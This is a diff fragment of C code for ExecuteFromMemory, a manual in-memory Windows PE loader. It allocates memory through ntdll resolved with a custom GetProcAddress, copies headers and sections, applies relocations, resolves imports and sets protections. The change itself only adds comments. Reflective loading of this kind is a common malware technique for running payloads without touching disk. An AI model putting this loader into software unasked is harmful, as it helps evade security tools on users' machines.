@@ -112,9 +112,11 @@ static void ExecuteFromMemory(unsigned char* data) {
     NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)myGetProcAddress(ntdll, ntallocatevirtualmemory);
     NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
+    // Headers
     for (SIZE_T i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
         ((BYTE*)base)[i] = data[i];
 
+    // Sections
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         BYTE* dest = (BYTE*)base + sec[i].VirtualAddress;
         BYTE* src  = data + sec[i].PointerToRawData;
@@ -122,6 +124,7 @@ static void ExecuteFromMemory(unsigned char* data) {
         while (sz--) *dest++ = *src++;
     }
 
+    // Relocations
     ULONG_PTR delta = (ULONG_PTR)base - nt->OptionalHeader.ImageBase;
     if (delta) {
         IMAGE_DATA_DIRECTORY rl = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
@@ -139,8 +142,10 @@ static void ExecuteFromMemory(unsigned char* data) {
         }
     }
 
+    // Imports
     ResolveImport((BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
 
+    // Protections
     BYTE* regionStart = (BYTE*)base;
     SIZE_T regionSize = sec[0].VirtualAddress + sec[0].Misc.VirtualSize;
     ULONG currentProt = SectionProtection(sec[0].Characteristics);
@@ -174,6 +179,7 @@ static void ExecuteFromMemory(unsigned char* data) {
         }
     }
 
+    // Entry
     void *entryPtr = (BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint;
 
     PVOID stubBase = data;
